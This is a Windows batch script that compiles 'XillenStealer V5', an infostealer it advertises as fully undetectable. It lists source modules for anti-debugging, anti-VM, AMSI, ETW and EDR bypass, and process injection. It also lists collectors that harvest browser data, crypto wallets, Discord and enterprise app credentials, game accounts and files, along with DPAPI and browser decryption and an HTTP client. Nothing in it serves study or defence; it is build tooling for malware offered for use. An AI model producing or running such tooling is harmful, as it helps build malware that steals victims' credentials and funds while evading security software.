@echo off
cd /d "%~dp0"

echo Building XillenStealer V5 with 100%% FUD evasion...
echo.

C:\msys64\mingw64\bin\g++.exe -o xillen_v5.exe ^
src\core\main.cpp ^
src\core\stealer.cpp ^
src\evasion\anti_debug.cpp ^
src\evasion\anti_vm.cpp ^
src\evasion\import_hiding.cpp ^
src\evasion\runtime_decrypt.cpp ^
src\evasion\process_injection.cpp ^
src\evasion\amsi_bypass.cpp ^
src\evasion\etw_bypass.cpp ^
src\evasion\edr_bypass.cpp ^
src\evasion\api_hammering.cpp ^
src\collectors\browser_collector.cpp ^
src\collectors\wallet_collector.cpp ^
src\collectors\app_collector.cpp ^
src\collectors\discord_collector.cpp ^
src\collectors\enterprise_collector.cpp ^
src\collectors\file_grabber.cpp ^
src\collectors\gaming_collector.cpp ^
src\collectors\browser_decryptor.cpp ^
src\crypto\aes.cpp ^
src\crypto\dpapi.cpp ^
src\crypto\hash.cpp ^
src\crypto\chacha20.cpp ^
src\memory\memory_archive.cpp ^
src\memory\memory_encrypt.cpp ^
src\memory\secure_delete.cpp ^
src\utils\http_client.cpp ^
src\utils\json_builder.cpp ^
src\utils\mutex.cpp ^
-lwininet -lwinhttp -lcrypt32 -liphlpapi -lpsapi -lshell32 -lshlwapi -lbcrypt ^
-O3 -s -static -std=c++20

if %ERRORLEVEL% EQU 0 (
    echo.
    echo [+] BUILD SUCCESS!
    echo [+] Executable: xillen_v5.exe
    echo.
    dir /b xillen_v5.exe
    echo.
    echo ========================================
    echo 100%% FUD EVASION READY!
    echo ========================================
) else (
    echo.
    echo [!] BUILD FAILED!
    echo Error code: %ERRORLEVEL%
)

pause
